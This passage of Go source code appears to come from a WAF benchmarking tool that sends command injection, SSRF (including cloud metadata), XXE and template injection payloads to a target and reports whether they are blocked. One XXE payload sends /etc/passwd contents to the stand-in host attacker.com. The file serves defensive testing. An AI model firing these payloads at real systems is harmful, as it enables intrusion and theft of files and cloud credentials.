			result.Passed = false
			result.Reason = "Command Executed"
			result.Details = "Command injection successful - /etc/passwd content exposed"
			result.Evidence["output"] = bodyStr[:min(200, len(bodyStr))]
		} else if resp.StatusCode == 403 || resp.StatusCode == 429 {
			result.Passed = true
			result.Reason = "Command Blocked"
			result.Details = "WAF blocked command injection attempt"
		} else {
			result.Passed = true
			result.Reason = "No Command Execution"
			result.Details = "Command not executed or output not returned"
		}

		results.Tests = append(results.Tests, result)
		printResult(result)
	}
}

func testCommandInjectionBlind(client *http.Client, targetURL string, results *TestResults) {
	start := time.Now()
	resp, err := client.Get(targetURL + "/?ip=127.0.0.1; ping -c 4 attacker.com")

	result := TestResult{
		ID:        "CMD-BLIND",
		Name:      "Command Injection - Blind/DNS",
		Category:  "Command Injection",
		Severity:  "Critical",
		Payload:   "127.0.0.1; ping -c 4 attacker.com",
		Timestamp: time.Now().Format(time.RFC3339),
		Evidence:  make(map[string]string),
	}

	if err != nil {
		result.Passed = true
		result.Reason = "Request Blocked"
		result.Duration = time.Since(start).Milliseconds()
		results.Tests = append(results.Tests, result)
		printResult(result)
		return
	}
	defer resp.Body.Close()

	result.Duration = time.Since(start).Milliseconds()
	result.StatusCode = resp.StatusCode

	if resp.StatusCode == 403 || resp.StatusCode == 429 {
		result.Passed = true
		result.Reason = "Blind Injection Blocked"
		result.Details = "WAF detected blind command injection pattern"
	} else {
		result.Passed = true
		result.Reason = "No Blind Execution Evidence"
		result.Details = "Cannot verify blind injection without DNS logs"
	}

	results.Tests = append(results.Tests, result)
	printResult(result)
}

func testCommandInjectionEvasion(client *http.Client, targetURL string, results *TestResults) {
	start := time.Now()
	resp, err := client.Get(targetURL + "/?cmd=cat${IFS}/etc/passwd")

	result := TestResult{
		ID:        "CMD-EVADE",
		Name:      "Command Injection - IFS Evasion",
		Category:  "Command Injection",
		Severity:  "High",
		Payload:   "cat${IFS}/etc/passwd",
		Timestamp: time.Now().Format(time.RFC3339),
		Evidence:  make(map[string]string),
	}

	if err != nil {
		result.Passed = true
		result.Reason = "Request Blocked"
		result.Duration = time.Since(start).Milliseconds()
		results.Tests = append(results.Tests, result)
		printResult(result)
		return
	}
	defer resp.Body.Close()

	io.Copy(io.Discard, resp.Body)
	result.Duration = time.Since(start).Milliseconds()
	result.StatusCode = resp.StatusCode

	if resp.StatusCode == 403 {
		result.Passed = true
		result.Reason = "Evasion Blocked"
		result.Details = "WAF detected IFS-based command injection evasion"
	} else {
		result.Passed = true
		result.Reason = "Evasion Failed"
		result.Details = "IFS variable substitution did not bypass filters"
	}

	results.Tests = append(results.Tests, result)
	printResult(result)
}

func testSSRFLocalhost(client *http.Client, targetURL string, results *TestResults) {
	payloads := []ExploitPayload{
		{"SSRF-1", "http://127.0.0.1", "Localhost IP", "Critical"},
		{"SSRF-2", "http://localhost", "Localhost name", "Critical"},
		{"SSRF-3", "http://0.0.0.0", "All interfaces", "Critical"},
		{"SSRF-4", "file:///etc/passwd", "File protocol", "Critical"},
	}

	for _, p := range payloads {
		start := time.Now()
		resp, err := client.Get(targetURL + "/?url=" + p.Payload)

		result := TestResult{
			ID:        p.Name,
			Name:      "SSRF - " + p.Description,
			Category:  "Server-Side Request Forgery",
			Severity:  p.Severity,
			Payload:   p.Payload,
			Timestamp: time.Now().Format(time.RFC3339),
			Evidence:  make(map[string]string),
		}

		if err != nil {
			result.Passed = true
			result.Reason = "Request Blocked"
			result.Duration = time.Since(start).Milliseconds()
			results.Tests = append(results.Tests, result)
			printResult(result)
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		result.Duration = time.Since(start).Milliseconds()
		result.StatusCode = resp.StatusCode

		bodyStr := string(body)

		// Check for localhost response indicators
		if strings.Contains(bodyStr, "root:") || strings.Contains(bodyStr, "Apache") ||
			strings.Contains(bodyStr, "nginx") || strings.Contains(bodyStr, "localhost") {
			result.Passed = false
			result.Reason = "Local Resource Accessed"
			result.Details = "SSRF successfully accessed local resource"
			result.Evidence["response"] = bodyStr[:min(100, len(bodyStr))]
		} else if resp.StatusCode == 403 || resp.StatusCode == 406 {
			result.Passed = true
			result.Reason = "SSRF Blocked"
			result.Details = "WAF detected and blocked SSRF attempt"
		} else {
			result.Passed = true
			result.Reason = "No SSRF Exploitation"
			result.Details = "Local resource not accessible via SSRF"
		}

		results.Tests = append(results.Tests, result)
		printResult(result)
	}
}

func testSSRFCloudMetadata(client *http.Client, targetURL string, results *TestResults) {
	start := time.Now()
	resp, err := client.Get(targetURL + "/?url=http://169.254.169.254/latest/meta-data/")

	result := TestResult{
		ID:        "SSRF-CLOUD",
		Name:      "SSRF - Cloud Metadata",
		Category:  "Server-Side Request Forgery",
		Severity:  "Critical",
		Payload:   "http://169.254.169.254/latest/meta-data/",
		Timestamp: time.Now().Format(time.RFC3339),
		Evidence:  make(map[string]string),
	}

	if err != nil {
		result.Passed = true
		result.Reason = "Request Blocked"
		result.Duration = time.Since(start).Milliseconds()
		results.Tests = append(results.Tests, result)
		printResult(result)
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	result.Duration = time.Since(start).Milliseconds()
	result.StatusCode = resp.StatusCode

	bodyStr := string(body)

	// Check for metadata response
	if strings.Contains(bodyStr, "ami-id") || strings.Contains(bodyStr, "instance-id") ||
		strings.Contains(bodyStr, "hostname") || strings.Contains(bodyStr, "local-ipv4") {
		result.Passed = false
		result.Reason = "Cloud Metadata Exposed"
		result.Details = "SSRF successfully accessed cloud metadata endpoint"
		result.Evidence["metadata"] = bodyStr[:min(200, len(bodyStr))]
	} else if resp.StatusCode == 403 {
		result.Passed = true
		result.Reason = "Metadata Blocked"
		result.Details = "WAF blocked cloud metadata access"
	} else {
		result.Passed = true
		result.Reason = "Metadata Not Accessible"
		result.Details = "Cloud metadata endpoint not accessible via SSRF"
	}

	results.Tests = append(results.Tests, result)
	printResult(result)
}

func testSSRFAlternativeIPs(client *http.Client, targetURL string, results *TestResults) {
	start := time.Now()
	resp, err := client.Get(targetURL + "/?url=http://0177.0.0.1/")

	result := TestResult{
		ID:        "SSRF-ALT",
		Name:      "SSRF - Alternative IP Encoding",
		Category:  "Server-Side Request Forgery",
		Severity:  "High",
		Payload:   "http://0177.0.0.1/",
		Timestamp: time.Now().Format(time.RFC3339),
		Evidence:  make(map[string]string),
	}

	if err != nil {
		result.Passed = true
		result.Reason = "Request Blocked"
		result.Duration = time.Since(start).Milliseconds()
		results.Tests = append(results.Tests, result)
		printResult(result)
		return
	}
	defer resp.Body.Close()

	result.Duration = time.Since(start).Milliseconds()
	result.StatusCode = resp.StatusCode

	if resp.StatusCode == 403 {
		result.Passed = true
		result.Reason = "Alt Encoding Blocked"
		result.Details = "WAF detected and blocked octal IP encoding"
	} else {
		result.Passed = true
		result.Reason = "Encoding Not Bypassed"
		result.Details = "Alternative IP encoding did not bypass filters"
	}

	results.Tests = append(results.Tests, result)
	printResult(result)
}

func testXXEBasic(client *http.Client, targetURL string, results *TestResults) {
	xxePayload := `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`

	start := time.Now()
	resp, err := client.Post(targetURL+"/api/xml", "application/xml", strings.NewReader(xxePayload))

	result := TestResult{
		ID:        "XXE-BASIC",
		Name:      "XXE - Basic File Read",
		Category:  "XML External Entity",
		Severity:  "Critical",
		Payload:   "DTD entity file read",
		Timestamp: time.Now().Format(time.RFC3339),
		Evidence:  make(map[string]string),
	}

	if err != nil {
		result.Passed = true
		result.Reason = "Request Blocked"
		result.Duration = time.Since(start).Milliseconds()
		results.Tests = append(results.Tests, result)
		printResult(result)
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	result.Duration = time.Since(start).Milliseconds()
	result.StatusCode = resp.StatusCode

	bodyStr := string(body)

	if strings.Contains(bodyStr, "root:") || strings.Contains(bodyStr, "daemon:") {
		result.Passed = false
		result.Reason = "XXE Successful"
		result.Details = "External entity processed and file content returned"
		result.Evidence["file_content"] = bodyStr[:min(200, len(bodyStr))]
	} else if resp.StatusCode == 403 || resp.StatusCode == 400 {
		result.Passed = true
		result.Reason = "XXE Blocked"
		result.Details = "WAF or parser blocked external entity"
	} else {
		result.Passed = true
		result.Reason = "XXE Not Exploitable"
		result.Details = "External entities not processed or no DTD support"
	}

	results.Tests = append(results.Tests, result)
	printResult(result)
}

func testXXEParamEntity(client *http.Client, targetURL string, results *TestResults) {
	xxePayload := `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % pe "<!ENTITY exfil SYSTEM 'http://attacker.com/?%xxe;'>">%pe;]><foo>&exfil;</foo>`

	start := time.Now()
	resp, err := client.Post(targetURL+"/api/xml", "application/xml", strings.NewReader(xxePayload))

	result := TestResult{
		ID:        "XXE-BLIND",
		Name:      "XXE - Blind/Out-of-Band",
		Category:  "XML External Entity",
		Severity:  "Critical",
		Payload:   "Parameter entity OOB",
		Timestamp: time.Now().Format(time.RFC3339),
		Evidence:  make(map[string]string),
	}

	if err != nil {
		result.Passed = true
		result.Reason = "Request Blocked"
		result.Duration = time.Since(start).Milliseconds()
		results.Tests = append(results.Tests, result)
		printResult(result)
		return
	}
	defer resp.Body.Close()

	result.Duration = time.Since(start).Milliseconds()
	result.StatusCode = resp.StatusCode

	if resp.StatusCode == 403 {
		result.Passed = true
		result.Reason = "OOB XXE Blocked"
		result.Details = "WAF detected parameter entity OOB attempt"
	} else {
		result.Passed = true
		result.Reason = "OOB Not Confirmed"
		result.Details = "Cannot verify OOB XXE without external DNS logs"
	}

	results.Tests = append(results.Tests, result)
	printResult(result)
}

func testSSTIGeneric(client *http.Client, targetURL string, results *TestResults) {
	start := time.Now()
	resp, err := client.Get(targetURL + "/?template={{7*7}}")

	result := TestResult{
		ID:        "SSTI-GEN",
		Name:      "SSTI - Generic Detection",
		Category:  "Server-Side Template Injection",
		Severity:  "High",
		Payload:   "{{7*7}}",
		Timestamp: time.Now().Format(time.RFC3339),
		Evidence:  make(map[string]string),
	}

	if err != nil {
		result.Passed = true
		result.Reason = "Request Blocked"
		result.Duration = time.Since(start).Milliseconds()
		results.Tests = append(results.Tests, result)
		printResult(result)
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	result.Duration = time.Since(start).Milliseconds()
	result.StatusCode = resp.StatusCode

	bodyStr := string(body)

	// Check for 49 (7*7) in response
	if strings.Contains(bodyStr, "49") && !strings.Contains(bodyStr, "7*7") {
		result.Passed = false
		result.Reason = "SSTI Detected"
		result.Details = "Template expression evaluated: 7*7 = 49"
		result.Evidence["evaluation"] = "7*7 = 49"
	} else if resp.StatusCode == 403 {
		result.Passed = true
		result.Reason = "SSTI Blocked"
		result.Details = "WAF blocked template injection attempt"
	} else {
		result.Passed = true
		result.Reason = "No SSTI"
		result.Details = "Template expression not evaluated"
	}

	results.Tests = append(results.Tests, result)
	printResult(result)
}

func testSSTIJinja2(client *http.Client, targetURL string, results *TestResults) {
	start := time.Now()
	resp, err := client.Get(targetURL + "/?name={{config.items()}}")

	result := TestResult{
		ID:        "SSTI-JINJA",
		Name:      "SSTI - Jinja2/Flask",
		Category:  "Server-Side Template Injection",
		Severity:  "Critical",
		Payload:   "{{config.items()}}",
		Timestamp: time.Now().Format(time.RFC3339),
		Evidence:  make(map[string]string),
	}

	if err != nil {
		result.Passed = true
		result.Reason = "Request Blocked"
		result.Duration = time.Since(start).Milliseconds()
		results.Tests = append(results.Tests, result)
		printResult(result)
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	result.Duration = time.Since(start).Milliseconds()
	result.StatusCode = resp.StatusCode

	bodyStr := string(body)

	// Check for Jinja config output
	if strings.Contains(bodyStr, "SECRET_KEY") || strings.Contains(bodyStr, "SQLALCHEMY") ||
		strings.Contains(bodyStr, "Environ") || strings.Contains(bodyStr, "<Config") {
		result.Passed = false
		result.Reason = "Flask Config Leaked"
		result.Details = "Jinja2 SSTI successfully exposed Flask configuration"
		result.Evidence["config_preview"] = bodyStr[:min(200, len(bodyStr))]
	} else if resp.StatusCode == 403 {
		result.Passed = true
		result.Reason = "Jinja SSTI Blocked"
		result.Details = "WAF blocked Jinja2 template injection"
	} else {
		result.Passed = true
		result.Reason = "No Jinja SSTI"
		result.Details = "No evidence of Jinja2 template evaluation"
	}

	results.Tests = append(results.Tests, result)
	printResult(result)
}

func testSSTIPHP(client *http.Client, targetURL string, results *TestResults) {
	start := time.Now()
	resp, err := client.Get(targetURL + "/?var={$smarty.version}")

	result := TestResult{
		ID:        "SSTI-PHP",
		Name:      "SSTI - PHP/Smarty",
		Category:  "Server-Side Template Injection",
		Severity:  "High",
		Payload:   "{$smarty.version}",
		Timestamp: time.Now().Format(time.RFC3339),
		Evidence:  make(map[string]string),
	}

	if err != nil {
		result.Passed = true
		result.Reason = "Request Blocked"
		result.Duration = time.Since(start).Milliseconds()
		results.Tests = append(results.Tests, result)
		printResult(result)
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	result.Duration = time.Since(start).Milliseconds()
	result.StatusCode = resp.StatusCode

	bodyStr := string(body)

	// Check for Smarty version
	if strings.Contains(bodyStr, "Smarty") || regexp.MustCompile(`\d+\.\d+\.\d+`).MatchString(bodyStr) {
		result.Passed = false
		result.Reason = "Smarty SSTI Detected"
		result.Details = "PHP template engine exposed version info"
	} else if resp.StatusCode == 403 {
		result.Passed = true
		result.Reason = "PHP SSTI Blocked"
		result.Details = "WAF blocked PHP template injection"
	} else {
		result.Passed = true
		result.Reason = "No PHP SSTI"
		result.Details = "No evidence of PHP template evaluation"
	}

	results.Tests = append(results.Tests, result)
	printResult(result)
}

// Utility functions

func printResult(result TestResult) {
	status := "✗"
	statusColor := "\033[31m" // Red
	if result.Passed {
		status = "✓"
		statusColor = "\033[32m" // Green
	}
	reset := "\033[0m"

	fmt.Printf("  [%s%s%s] %s: %s\n", statusColor, status, reset, result.ID, result.Name)
	fmt.Printf("      Status: %s (HTTP %d) | Duration: %dms\n", result.Reason, result.StatusCode, result.Duration)
	if result.Details != "" {
		fmt.Printf("      └─> %s\n", result.Details)
	}
	if len(result.Evidence) > 0 {
		for k, v := range result.Evidence {
			if len(v) > 50 {
				v = v[:50] + "..."
			}
			fmt.Printf("      └─> Evidence [%s]: %s\n", k, v)
		}
	}
}

func generateJSONReport(results *TestResults) {
	os.MkdirAll("./reports", 0755)
	data, _ := json.MarshalIndent(results, "", "  ")
	os.WriteFile("./reports/benchmark_report.json", data, 0644)
}

func generateHTMLReport(results *TestResults) {
	os.MkdirAll("./reports", 0755)

	// Group tests by category
	categories := make(map[string][]TestResult)
	for _, t := range results.Tests {
		categories[t.Category] = append(categories[t.Category], t)
	}

	html := fmt.Sprintf(`<!DOCTYPE html>
<html>
<head>
	<title>WAF Benchmark Report - %s</title>
	<style>
		* { box-sizing: border-box; }
		body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; background: #f0f2f5; color: #333; }
		.container { max-width: 1400px; margin: 0 auto; padding: 20px; }
		.header { background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%); color: white; padding: 30px; border-radius: 10px; margin-bottom: 20px; }
		.header h1 { margin: 0 0 10px 0; font-size: 2em; }
		.header .meta { opacity: 0.9; font-size: 0.95em; }

		.stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
		.stat-card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); text-align: center; }
		.stat-card .number { font-size: 2.5em; font-weight: bold; margin-bottom: 5px; }
		.stat-card.pass { color: #28a745; }
		.stat-card.fail { color: #dc3545; }
		.stat-card.block { color: #ffc107; }
		.stat-card.info { color: #17a2b8; }

		.category { background: white; margin-bottom: 20px; border-radius: 10px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
		.category-header { background: #f8f9fa; padding: 15px 20px; font-weight: bold; font-size: 1.1em; border-bottom: 1px solid #dee2e6; }
		.test { padding: 15px 20px; border-bottom: 1px solid #f0f0f0; }
		.test:last-child { border-bottom: none; }
		.test-header { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; }
		.test-id { font-family: monospace; font-size: 0.85em; color: #666; }
		.test-name { font-weight: 500; }
		.badge { padding: 3px 8px; border-radius: 4px; font-size: 0.75em; font-weight: 600; text-transform: uppercase; }
		.badge-pass { background: #d4edda; color: #155724; }
		.badge-fail { background: #f8d7da; color: #721c24; }
		.badge-critical { background: #dc3545; color: white; }
		.badge-high { background: #fd7e14; color: white; }
		.badge-medium { background: #ffc107; color: black; }
		.badge-low { background: #6c757d; color: white; }

		.test-details { margin-left: 30px; color: #666; font-size: 0.9em; }
		.test-reason { margin-bottom: 5px; }
		.test-reason strong { color: #333; }
		.evidence { background: #f8f9fa; padding: 8px 12px; border-radius: 4px; margin-top: 8px; font-family: monospace; font-size: 0.85em; word-break: break-all; }
		.evidence-label { color: #666; margin-bottom: 5px; }

		.footer { text-align: center; padding: 20px; color: #666; font-size: 0.9em; }
	</style>
</head>
<body>
	<div class="container">
		<div class="header">
			<h1>WAF Benchmark Report - Phase A</h1>
			<div class="meta">
				Target: <strong>%s</strong> |
				Generated: %s |
				Duration: %d ms
			</div>
		</div>

		<div class="stats">
			<div class="stat-card info">
				<div class="number">%d</div>
				<div>Total Tests</div>
			</div>
			<div class="stat-card pass">
				<div class="number">%d</div>
				<div>Passed</div>
			</div>
			<div class="stat-card fail">
				<div class="number">%d</div>
				<div>Failed</div>
			</div>
			<div class="stat-card block">
				<div class="number">%d</div>
				<div>Blocked by WAF</div>
			</div>
			<div class="stat-card info">
				<div class="number">%.1f%%</div>
				<div>Pass Rate</div>
			</div>
		</div>
`, results.Target, results.Timestamp, results.Duration,
		len(results.Tests), results.Passed, results.Failed, results.Blocked,
		float64(results.Passed)/float64(len(results.Tests))*100)

	// Add each category
	for category, tests := range categories {
		html += fmt.Sprintf(`
		<div class="category">
			<div class="category-header">%s (%d tests)</div>
`, category, len(tests))

		for _, test := range tests {
			statusBadge := "badge-pass"
			if !test.Passed {
				statusBadge = "badge-fail"
			}

			severityBadge := "badge-low"
			switch test.Severity {
			case "Critical":
				severityBadge = "badge-critical"
			case "High":
				severityBadge = "badge-high"
			case "Medium":
				severityBadge = "badge-medium"
			}

			html += fmt.Sprintf(`
			<div class="test">
				<div class="test-header">
					<span class="test-id">%s</span>
					<span class="test-name">%s</span>
					<span class="badge %s">%s</span>
					<span class="badge %s">%s</span>
				</div>
				<div class="test-details">
					<div class="test-reason"><strong>Reason:</strong> %s</div>
					<div>HTTP Status: %d | Duration: %dms</div>
`, test.ID, test.Name, statusBadge, map[bool]string{true: "PASS", false: "FAIL"}[test.Passed],
				severityBadge, test.Severity, test.Reason, test.StatusCode, test.Duration)

			if test.Details != "" {
				html += fmt.Sprintf(`
					<div style="margin-top: 5px;"><strong>Details:</strong> %s</div>
`, test.Details)
			}

			if len(test.Evidence) > 0 {
				html += `
					<div class="evidence">
						<div class="evidence-label">Evidence:</div>
`
				for k, v := range test.Evidence {
					if len(v) > 100 {
						v = v[:100] + "..."
					}
					html += fmt.Sprintf(`
						<div>%s: %s</div>
`, k, v)
				}
				html += `
					</div>
`
			}

			html += `
			</div>
		</div>
`
		}

		html += `
		</div>
`
	}

	html += `
		<div class="footer">
			<p>Generated by WAF Benchmark Tool v2.1 | OWASP Based Test Suite</p>
		</div>
	</div>
</body>
</html>`

	os.WriteFile("./reports/benchmark_report.html", []byte(html), 0644)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
